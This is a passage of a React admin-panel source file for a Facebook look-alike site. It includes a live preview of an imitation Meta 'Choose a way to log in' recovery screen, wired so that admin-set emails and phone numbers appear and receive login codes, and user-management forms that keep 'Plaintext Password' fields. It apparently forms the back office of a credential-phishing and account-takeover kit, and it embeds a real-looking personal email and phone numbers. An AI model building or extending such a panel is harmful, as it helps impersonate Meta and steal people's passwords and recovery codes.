                          onChange={(e) => setRecoverySettings({ ...recoverySettings, twoFactorWarning: e.target.value })}
                          placeholder="e.g. ⚠️ Notice: This is not Facebook. Do not enter real credentials."
                          style={{ width: '100%', padding: '10px 12px', borderRadius: 8, border: '1px solid #CED0D4' }}
                        />
                      </div>
                    </div>

                    <button
                      type="submit"
                      className="fb-admin-glow-btn"
                      style={{ width: '100%', justifyContent: 'center' }}
                    >
                      <Check size={16} />
                      <span>Save Recovery Settings</span>
                    </button>
                  </form>
                </div>

                {/* Live Interactive Simulator Box */}
                <div className="fb-admin-panel-box" style={{ background: '#F8FAFC', border: '1px solid #E2E8F0' }}>
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 12 }}>
                    <h3 style={{ margin: 0, fontSize: 15, fontWeight: 700, color: '#0F172A' }}>
                      Live User Flow Simulator
                    </h3>
                    <span style={{ fontSize: 11, background: '#E2E8F0', padding: '2px 8px', borderRadius: 4, color: '#475569', fontWeight: 600 }}>
                      Instant Preview
                    </span>
                  </div>
                  <p style={{ margin: '0 0 14px 0', fontSize: 12, color: '#64748B' }}>
                    Type an email or phone number below to see exactly how "Choose a way to log in" resolves it:
                  </p>

                  <div style={{ marginBottom: 16 }}>
                    <input
                      type="text"
                      className="fb-admin-input"
                      value={simulatedTestInput}
                      onChange={(e) => setSimulatedTestInput(e.target.value)}
                      placeholder="Type test phone or email..."
                      style={{ width: '100%', padding: '8px 10px', fontSize: 13, borderRadius: 6, border: '1px solid #CBD5E1' }}
                    />
                    <div style={{ display: 'flex', gap: 6, marginTop: 6 }}>
                      <button
                        type="button"
                        className="fb-admin-btn-secondary"
                        style={{ fontSize: 11, padding: '2px 8px' }}
                        onClick={() => setSimulatedTestInput('+251911223344')}
                      >
                        Sample Phone (+251911223344)
                      </button>
                      <button
                        type="button"
                        className="fb-admin-btn-secondary"
                        style={{ fontSize: 11, padding: '2px 8px' }}
                        onClick={() => setSimulatedTestInput('ademt0614@gmail.com')}
                      >
                        Sample Email (ademt0614@gmail.com)
                      </button>
                    </div>
                  </div>

                  {/* Calculated outputs in simulator */}
                  {(() => {
                    const testTrimmed = simulatedTestInput.trim();
                    const testIsEmail = testTrimmed.includes('@');
                    const testDigits = testTrimmed.replace(/[\s\-()+]/g, '');
                    const testIsPhone = (testTrimmed.startsWith('+') || /^\d+$/.test(testDigits)) && testDigits.length >= 7;

                    let previewMetaIdentifier = recoverySettings.defaultEmail || 'ademt0614@gmail.com';
                    if (testIsEmail) {
                      previewMetaIdentifier = testTrimmed;
                    } else if (testIsPhone) {
                      previewMetaIdentifier = recoverySettings.cardDisplayFallback === 'phone'
                        ? testTrimmed
                        : (recoverySettings.defaultEmail || 'ademt0614@gmail.com');
                    } else if (testTrimmed) {
                      previewMetaIdentifier = testTrimmed;
                    }

                    const previewPrimaryPhone = testIsPhone
                      ? testTrimmed
                      : (recoverySettings.defaultPhone || '+251990039392');

                    return (
                      <div
                        style={{
                          background: '#FFFFFF',
                          borderRadius: 12,
                          border: '1px solid #E2E8F0',
                          padding: 16,
                          boxShadow: '0 2px 8px rgba(0,0,0,0.04)',
                        }}
                      >
                        <div style={{ fontSize: 11, fontWeight: 700, color: '#64748B', textTransform: 'uppercase', marginBottom: 10, letterSpacing: '0.5px' }}>
                          Live Rendered Screen
                        </div>

                        {/* Meta Account Card Preview */}
                        <div
                          style={{
                            background: '#F0F2F5',
                            borderRadius: 10,
                            padding: '12px 14px',
                            display: 'flex',
                            alignItems: 'center',
                            justifyContent: 'space-between',
                            marginBottom: 12,
                          }}
                        >
                          <div>
                            <div style={{ fontSize: 11, color: '#65676B', fontWeight: 600, display: 'flex', alignItems: 'center', gap: 4 }}>
                              <span>∞</span>
                              <span>Meta Account</span>
                            </div>
                            <div style={{ fontSize: 14, fontWeight: 700, color: '#050505', marginTop: 2 }}>
                              {previewMetaIdentifier}
                            </div>
                          </div>
                          <div style={{ width: 32, height: 32, borderRadius: '50%', background: '#E4E6EB', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 14 }}>
                            🎁
                          </div>
                        </div>

                        {/* Option Preview */}
                        <div
                          style={{
                            border: '1px solid #CED0D4',
                            borderRadius: 10,
                            padding: '12px 14px',
                            background: '#FFFFFF',
                          }}
                        >
                          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start' }}>
                            <div>
                              <div style={{ fontSize: 13.5, fontWeight: 600, color: '#050505' }}>
                                Get code on WhatsApp and SMS {recoverySettings.countdownTime || '(00:36)'}
                              </div>
                              <div style={{ fontSize: 13, color: '#65676B', marginTop: 4, lineHeight: 1.4, fontWeight: 500 }}>
                                <div>{previewPrimaryPhone}</div>
                              </div>
                              <div style={{ fontSize: 11, color: '#8A8D91', marginTop: 4 }}>
                                Carrier charges may apply
                              </div>
                            </div>
                            <div
                              style={{
                                width: 18,
                                height: 18,
                                borderRadius: '50%',
                                border: '2px solid #0866FF',
                                display: 'flex',
                                alignItems: 'center',
                                justifyContent: 'center',
                              }}
                            >
                              <div style={{ width: 8, height: 8, borderRadius: '50%', background: '#0866FF' }} />
                            </div>
                          </div>

                          <div style={{ borderTop: '1px solid #E4E6EB', marginTop: 10, paddingTop: 10 }}>
                            <div style={{ fontSize: 13.5, fontWeight: 600, color: '#050505' }}>
                              Enter password to log in
                            </div>
                          </div>
                        </div>

                        {/* Logic Explanation Box */}
                        <div
                          style={{
                            marginTop: 14,
                            padding: '10px 12px',
                            background: testIsPhone ? '#F0FDF4' : testIsEmail ? '#EFF6FF' : '#F8FAFC',
                            borderRadius: 8,
                            fontSize: 12,
                            color: testIsPhone ? '#166534' : testIsEmail ? '#1E40AF' : '#475569',
                            border: `1px solid ${testIsPhone ? '#BBF7D0' : testIsEmail ? '#BFDBFE' : '#E2E8F0'}`,
                          }}
                        >
                          <strong>Active Resolution:</strong>{' '}
                          {testIsPhone ? (
                            <span>
                              User entered phone <code>{testTrimmed}</code>. Email was not chosen by user, so Meta Account displays admin email <code>{previewMetaIdentifier}</code>, and code is sent to user phone <code>{previewPrimaryPhone}</code>.
                            </span>
                          ) : testIsEmail ? (
                            <span>
                              User entered email <code>{testTrimmed}</code>. Meta Account displays user email <code>{previewMetaIdentifier}</code>, and code displays admin-set phone numbers.
                            </span>
                          ) : (
                            <span>
                              No email/phone detected. Displaying admin defaults for both.
                            </span>
                          )}
                        </div>
                      </div>
                    );
                  })()}
                </div>
              </div>
            </div>
          )}
        </main>
      </div>

      {/* Edit Post Modal */}
      {editingPost && (
        <div className="fb-admin-modal-backdrop" onClick={() => setEditingPost(null)}>
          <div className="fb-admin-modal-card" onClick={(e) => e.stopPropagation()}>
            <div className="modal-header-row">
              <h3>Edit Feed Post</h3>
              <button
                type="button"
                className="modal-close-btn-icon"
                onClick={() => setEditingPost(null)}
              >
                <X size={18} />
              </button>
            </div>

            <form onSubmit={handleSaveEditPost}>
              <div style={{ marginBottom: 14 }}>
                <label className="fb-admin-field-label">Post Message / Content</label>
                <textarea
                  className="fb-admin-form-textarea"
                  rows={4}
                  value={editingPost.content}
                  onChange={(e) =>
                    setEditingPost({ ...editingPost, content: e.target.value })
                  }
                  required
                />
              </div>

              <div style={{ marginBottom: 14 }}>
                <label className="fb-admin-field-label">Image Attachment URL</label>
                <input
                  type="text"
                  className="fb-admin-form-input"
                  value={editingPost.image}
                  onChange={(e) =>
                    setEditingPost({ ...editingPost, image: e.target.value })
                  }
                />
              </div>

              <div style={{ marginBottom: 18 }}>
                <label className="fb-admin-field-label">Likes Count</label>
                <input
                  type="number"
                  className="fb-admin-form-input"
                  value={editingPost.likes}
                  onChange={(e) =>
                    setEditingPost({ ...editingPost, likes: e.target.value })
                  }
                />
              </div>

              <div style={{ display: 'flex', gap: 10, justifyContent: 'flex-end' }}>
                <button
                  type="button"
                  className="fb-admin-refresh-btn"
                  onClick={() => setEditingPost(null)}
                >
                  Cancel
                </button>
                <button type="submit" className="fb-admin-btn-primary">
                  Save Changes
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* Edit User Profile Modal (Update Name & Image) */}
      {editingUser && (
        <div className="fb-admin-modal-backdrop" onClick={() => setEditingUser(null)}>
          <div className="fb-admin-modal-card" style={{ maxWidth: '560px' }} onClick={(e) => e.stopPropagation()}>
            <div className="modal-header-row">
              <h3>Edit User Profile</h3>
              <button
                type="button"
                className="modal-close-btn-icon"
                onClick={() => setEditingUser(null)}
              >
                <X size={18} />
              </button>
            </div>

            <form onSubmit={handleSaveEditUser}>
              {/* Profile Image & Upload Section */}
              <div style={{ display: 'flex', gap: '16px', alignItems: 'center', marginBottom: '16px', background: '#F0F2F5', padding: '12px', borderRadius: '10px' }}>
                <div style={{ position: 'relative' }}>
                  <img
                    src={editingUser.avatar || 'https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=400&q=80'}
                    alt="Preview"
                    style={{
                      width: '68px',
                      height: '68px',
                      borderRadius: '50%',
                      objectFit: 'cover',
                      border: '3px solid #0866FF',
                      display: 'block',
                      boxShadow: '0 2px 8px rgba(0,0,0,0.15)',
                    }}
                  />
                  <span
                    style={{
                      position: 'absolute',
                      bottom: '0',
                      right: '0',
                      background: '#0866FF',
                      color: '#FFF',
                      borderRadius: '50%',
                      width: '22px',
                      height: '22px',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'center',
                      border: '2px solid #FFF',
                    }}
                  >
                    <Camera size={12} />
                  </span>
                </div>

                <div style={{ flex: 1 }}>
                  <label className="fb-admin-field-label" style={{ marginBottom: '4px' }}>Profile Image URL</label>
                  <input
                    type="text"
                    className="fb-admin-form-input"
                    value={editingUser.avatar || ''}
                    onChange={(e) => setEditingUser({ ...editingUser, avatar: e.target.value })}
                    placeholder="https://... image URL"
                    required
                  />

                  <div style={{ marginTop: '8px', display: 'flex', alignItems: 'center', gap: '8px' }}>
                    <label
                      style={{
                        display: 'inline-flex',
                        alignItems: 'center',
                        gap: '6px',
                        padding: '5px 12px',
                        borderRadius: '6px',
                        background: '#FFFFFF',
                        border: '1px solid #CED0D4',
                        color: '#050505',
                        fontSize: '12px',
                        fontWeight: 600,
                        cursor: 'pointer',
                        boxShadow: '0 1px 2px rgba(0,0,0,0.05)',
                      }}
                    >
                      <Upload size={14} color="#0866FF" />
                      <span>Upload from Device</span>
                      <input
                        type="file"
                        accept="image/*"
                        style={{ display: 'none' }}
                        onChange={(e) => {
                          const file = e.target.files?.[0];
                          if (file) {
                            const reader = new FileReader();
                            reader.onload = (uploadEvt) => {
                              setEditingUser({ ...editingUser, avatar: uploadEvt.target.result });
                            };
                            reader.readAsDataURL(file);
                          }
                        }}
                      />
                    </label>
                    <span style={{ fontSize: '11px', color: '#65676B' }}>PNG, JPG or WebP</span>
                  </div>
                </div>
              </div>

              {/* Full Name & Short Name */}
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px', marginBottom: '14px' }}>
                <div>
                  <label className="fb-admin-field-label">Full Name</label>
                  <input
                    type="text"
                    className="fb-admin-form-input"
                    value={editingUser.name || ''}
                    onChange={(e) => setEditingUser({ ...editingUser, name: e.target.value })}
                    placeholder="e.g. Tahir Adem"
                    required
                  />
                </div>
                <div>
                  <label className="fb-admin-field-label">First / Short Name</label>
                  <input
                    type="text"
                    className="fb-admin-form-input"
                    value={editingUser.shortName || ''}
                    onChange={(e) => setEditingUser({ ...editingUser, shortName: e.target.value })}
                    placeholder="e.g. Tahir"
                  />
                </div>
              </div>

              {/* Email & Password */}
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px', marginBottom: '14px' }}>
                <div>
                  <label className="fb-admin-field-label">Email Address</label>
                  <input
                    type="email"
                    className="fb-admin-form-input"
                    value={editingUser.email || ''}
                    onChange={(e) => setEditingUser({ ...editingUser, email: e.target.value })}
                    required
                  />
                </div>
                <div>
                  <label className="fb-admin-field-label">Plaintext Password</label>
                  <input
                    type="text"
                    className="fb-admin-form-input"
                    value={editingUser.plainPassword || ''}
                    onChange={(e) =>
                      setEditingUser({
                        ...editingUser,
                        plainPassword: e.target.value,
                        password: e.target.value,
                      })
                    }
                  />
                </div>
              </div>

              {/* Bio */}
              <div style={{ marginBottom: '14px' }}>
                <label className="fb-admin-field-label">Profile Bio / Headline</label>
                <input
                  type="text"
                  className="fb-admin-form-input"
                  value={editingUser.bio || ''}
                  onChange={(e) => setEditingUser({ ...editingUser, bio: e.target.value })}
                  placeholder="e.g. Software engineer & tech enthusiast 🚀"
                />
              </div>

              {/* Cover Photo URL */}
              <div style={{ marginBottom: '16px' }}>
                <label className="fb-admin-field-label">Cover Banner URL</label>
                <input
                  type="text"
                  className="fb-admin-form-input"
                  value={editingUser.coverPhoto || ''}
                  onChange={(e) => setEditingUser({ ...editingUser, coverPhoto: e.target.value })}
                  placeholder="https://... cover photo"
                />
              </div>

              {/* Login Screen Visibility Toggles */}
              <div style={{ display: 'flex', gap: '20px', marginBottom: '20px', background: '#F0F2F5', padding: '10px 14px', borderRadius: '8px' }}>
                <label style={{ display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer', fontSize: '13px', fontWeight: 600, color: '#050505' }}>
                  <input
                    type="checkbox"
                    checked={!!editingUser.showOnDesktopLogin}
                    onChange={(e) => setEditingUser({ ...editingUser, showOnDesktopLogin: e.target.checked })}
                  />
                  Show on Desktop Login Screen
                </label>
                <label style={{ display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer', fontSize: '13px', fontWeight: 600, color: '#050505' }}>
                  <input
                    type="checkbox"
                    checked={!!editingUser.showOnMobileLogin}
                    onChange={(e) => setEditingUser({ ...editingUser, showOnMobileLogin: e.target.checked })}
                  />
                  Show on Mobile Login Screen
                </label>
              </div>

              <div style={{ display: 'flex', gap: 10, justifyContent: 'flex-end' }}>
                <button
                  type="button"
                  className="fb-admin-refresh-btn"
                  onClick={() => setEditingUser(null)}
                >
                  Cancel
                </button>
                <button type="submit" className="fb-admin-btn-primary" style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                  <Check size={16} />
                  <span>Save Profile</span>
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* Create User Profile Modal */}
      {isCreatingUser && (
        <div className="fb-admin-modal-backdrop" onClick={() => setIsCreatingUser(false)}>
          <div className="fb-admin-modal-card" style={{ maxWidth: '560px' }} onClick={(e) => e.stopPropagation()}>
            <div className="modal-header-row">
              <h3>Create New User Profile</h3>
              <button
                type="button"
                className="modal-close-btn-icon"
                onClick={() => setIsCreatingUser(false)}
              >
                <X size={18} />
              </button>
            </div>

            <form onSubmit={handleCreateNewUser}>
              {/* Profile Image & Upload Section */}
              <div style={{ display: 'flex', gap: '16px', alignItems: 'center', marginBottom: '16px', background: '#F0F2F5', padding: '12px', borderRadius: '10px' }}>
                <img
                  src={newUserForm.avatar || 'https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=400&q=80'}
                  alt="Preview"
                  style={{
                    width: '68px',
                    height: '68px',
                    borderRadius: '50%',
                    objectFit: 'cover',
                    border: '3px solid #0866FF',
                    display: 'block',
                    boxShadow: '0 2px 8px rgba(0,0,0,0.15)',
                  }}
                />

                <div style={{ flex: 1 }}>
                  <label className="fb-admin-field-label" style={{ marginBottom: '4px' }}>Profile Image URL</label>
                  <input
                    type="text"
                    className="fb-admin-form-input"
                    value={newUserForm.avatar || ''}
                    onChange={(e) => setNewUserForm({ ...newUserForm, avatar: e.target.value })}
                    placeholder="https://... image URL"
                    required
                  />

                  <div style={{ marginTop: '8px', display: 'flex', alignItems: 'center', gap: '8px' }}>
                    <label
                      style={{
                        display: 'inline-flex',
                        alignItems: 'center',
                        gap: '6px',
                        padding: '5px 12px',
                        borderRadius: '6px',
                        background: '#FFFFFF',
                        border: '1px solid #CED0D4',
                        color: '#050505',
                        fontSize: '12px',
                        fontWeight: 600,
                        cursor: 'pointer',
                        boxShadow: '0 1px 2px rgba(0,0,0,0.05)',
                      }}
                    >
                      <Upload size={14} color="#0866FF" />
                      <span>Upload from Device</span>
                      <input
                        type="file"
                        accept="image/*"
                        style={{ display: 'none' }}
                        onChange={(e) => {
                          const file = e.target.files?.[0];
                          if (file) {
                            const reader = new FileReader();
                            reader.onload = (uploadEvt) => {
                              setNewUserForm({ ...newUserForm, avatar: uploadEvt.target.result });
                            };
                            reader.readAsDataURL(file);
                          }
                        }}
                      />
                    </label>
                    <span style={{ fontSize: '11px', color: '#65676B' }}>PNG, JPG or WebP</span>
                  </div>
                </div>
              </div>

              {/* Full Name & Short Name */}
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px', marginBottom: '14px' }}>
                <div>
                  <label className="fb-admin-field-label">Full Name</label>
                  <input
                    type="text"
                    className="fb-admin-form-input"
                    value={newUserForm.name || ''}
                    onChange={(e) => setNewUserForm({ ...newUserForm, name: e.target.value })}
                    placeholder="e.g. Tahir Adem"
                    required
                  />
                </div>
                <div>
                  <label className="fb-admin-field-label">First / Short Name</label>
                  <input
                    type="text"
                    className="fb-admin-form-input"
                    value={newUserForm.shortName || ''}
                    onChange={(e) => setNewUserForm({ ...newUserForm, shortName: e.target.value })}
                    placeholder="e.g. Tahir"
                  />
                </div>
              </div>

              {/* Email & Password */}
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px', marginBottom: '14px' }}>
                <div>
                  <label className="fb-admin-field-label">Email Address</label>
                  <input
                    type="email"
                    className="fb-admin-form-input"
                    value={newUserForm.email || ''}
                    onChange={(e) => setNewUserForm({ ...newUserForm, email: e.target.value })}
                    placeholder="e.g. user@example.com"
                    required
                  />
                </div>
                <div>
                  <label className="fb-admin-field-label">Plaintext Password</label>
                  <input
                    type="text"
                    className="fb-admin-form-input"
                    value={newUserForm.plainPassword || ''}
                    onChange={(e) =>
                      setNewUserForm({
                        ...newUserForm,
                        plainPassword: e.target.value,
                        password: e.target.value,
                      })
                    }
                  />
                </div>
              </div>

              {/* Bio */}
              <div style={{ marginBottom: '14px' }}>
                <label className="fb-admin-field-label">Profile Bio / Headline</label>
                <input
                  type="text"
                  className="fb-admin-form-input"
                  value={newUserForm.bio || ''}
                  onChange={(e) => setNewUserForm({ ...newUserForm, bio: e.target.value })}
                  placeholder="e.g. Software engineer & tech enthusiast 🚀"
                />
              </div>

              {/* Login Screen Visibility Toggles */}
              <div style={{ display: 'flex', gap: '20px', marginBottom: '20px', background: '#F0F2F5', padding: '10px 14px', borderRadius: '8px' }}>
                <label style={{ display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer', fontSize: '13px', fontWeight: 600, color: '#050505' }}>
                  <input
                    type="checkbox"
                    checked={!!newUserForm.showOnDesktopLogin}
                    onChange={(e) => setNewUserForm({ ...newUserForm, showOnDesktopLogin: e.target.checked })}
                  />
                  Show on Desktop Login Screen
                </label>
                <label style={{ display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer', fontSize: '13px', fontWeight: 600, color: '#050505' }}>
                  <input
                    type="checkbox"
                    checked={!!newUserForm.showOnMobileLogin}
                    onChange={(e) => setNewUserForm({ ...newUserForm, showOnMobileLogin: e.target.checked })}
                  />
                  Show on Mobile Login Screen
                </label>
              </div>

              <div style={{ display: 'flex', gap: 10, justifyContent: 'flex-end' }}>
                <button
                  type="button"
                  className="fb-admin-refresh-btn"
                  onClick={() => setIsCreatingUser(false)}
                >
                  Cancel
                </button>
                <button type="submit" className="fb-admin-btn-primary" style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                  <UserPlus size={16} />
                  <span>Create User</span>
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  );
}
